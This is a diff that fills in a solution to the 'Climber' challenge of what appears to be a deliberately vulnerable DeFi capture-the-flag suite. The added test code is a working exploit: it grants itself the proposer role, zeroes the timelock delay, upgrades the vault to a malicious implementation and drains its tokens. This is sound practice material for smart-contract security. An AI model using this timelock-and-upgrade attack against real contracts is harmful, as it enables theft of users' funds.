@@ -52,7 +52,69 @@ describe('[Challenge] Climber', function () {
     });
 
     it('Exploit', async function () {        
-        /** CODE YOUR EXPLOIT HERE */
+       
+        // Connect to existing contracts as attacker
+        const attackVault = this.vault.connect(attacker);
+        const attackTimeLock = this.timelock.connect(attacker);
+        const attackToken = this.token.connect(attacker);
+
+        // Deploy the attacking contract
+        const AttackContractFactory = await ethers.getContractFactory("AttackTimelock", attacker);
+        const attackContract = await AttackContractFactory.deploy(
+            attackVault.address,
+            attackTimeLock.address,
+            attackToken.address,
+            attacker.address);
+
+        // Deploy upgradable contract that will act as new logic contract instead of ClimberVault.sol
+        const MalciousVaultFactory = await ethers.getContractFactory("AttackVault", attacker);
+        const maliciousVaultContract = await MalciousVaultFactory.deploy();
+
+        const PROPOSER_ROLE = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("PROPOSER_ROLE"));
+
+        // Helper function to create ABIs
+        const createInterface = (signature, methodName, arguments) => {
+            const ABI = signature;
+            const IFace = new ethers.utils.Interface(ABI);
+            const ABIData = IFace.encodeFunctionData(methodName, arguments);
+            return ABIData;
+        }
+
+        // Set attacker contract as "proposer" for timelock
+        const setupRoleABI = ["function grantRole(bytes32 role, address account)"];
+        const grantRoleData = createInterface(setupRoleABI, "grantRole", [PROPOSER_ROLE, attackContract.address]);
+
+        // Update delay to 0
+        const updateDelayABI = ["function updateDelay(uint64 newDelay)"];
+        const updateDelayData = createInterface(updateDelayABI, "updateDelay", [0]);
+
+        // Call to the vault to upgrade to attacker controlled contract logic
+        const upgradeABI = ["function upgradeTo(address newImplementation)"];
+        const upgradeData = createInterface(upgradeABI, "upgradeTo", [maliciousVaultContract.address]);
+
+        // Call Attacking Contract to schedule these actions and sweep funds
+        const exploitABI = ["function exploit()"];
+        const exploitData = createInterface(exploitABI, "exploit", undefined);
+
+        const toAddress = [attackTimeLock.address, attackTimeLock.address, attackVault.address, attackContract.address];
+        const data = [grantRoleData, updateDelayData, upgradeData, exploitData]
+
+        // Set our 4 calls to attacking contract
+        await attackContract.setScheduleData(
+            toAddress,
+            data
+        );
+
+        // execute the 4 scheduled calls
+        await attackTimeLock.execute(
+            toAddress,
+            Array(data.length).fill(0),
+            data,
+            ethers.utils.hexZeroPad("0x00", 32)
+        );
+
+        // Withdraw our funds from attacking contract
+        await attackContract.withdraw();
     });
 
     after(async function () {
